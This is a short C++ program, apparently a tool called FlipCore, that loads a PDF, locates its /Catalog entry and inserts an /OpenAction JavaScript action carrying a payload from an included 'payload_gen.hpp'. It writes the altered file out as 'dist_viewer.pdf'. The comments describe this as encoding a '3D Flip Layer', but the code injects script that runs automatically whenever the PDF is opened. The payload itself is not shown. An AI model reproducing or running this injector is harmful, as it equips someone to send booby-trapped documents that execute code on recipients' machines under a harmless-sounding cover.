#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include "payload_gen.hpp"

class FlipCore {
public:
    void encode(const std::string& inputPath, const std::string& outputPath) {
        std::ifstream src(inputPath, std::ios::binary);
        if (!src) {
            std::cerr << "Error: Cannot find " << inputPath << std::endl;
            return;
        }

        // Load PDF bytes into a buffer
        std::vector<char> buffer((std::istreambuf_iterator<char>(src)), 
                                  std::istreambuf_iterator<char>());
        src.close();

        std::string content(buffer.begin(), buffer.end());
        
        // High-tier injection: Locating the Catalog and appending the JS Action
        size_t catalogPos = content.find("/Catalog");
        if (catalogPos != std::string::npos) {
            std::string injection = "/OpenAction << /S /JavaScript /JS (" + FLIP_JS_PAYLOAD + ") >>";
            content.insert(catalogPos + 8, injection);
            std::cout << "Successfully encoded 3D Flip Layer into PDF bytes." << std::endl;
        }

        std::ofstream dest(outputPath, std::ios::binary);
        dest.write(content.data(), content.size());
        dest.close();
        
        std::cout << "Output generated: " << outputPath << std::endl;
    }
};

int main() {
    FlipCore engine;
    // Process the PDF
    engine.encode("source.pdf", "dist_viewer.pdf");
    return 0;
}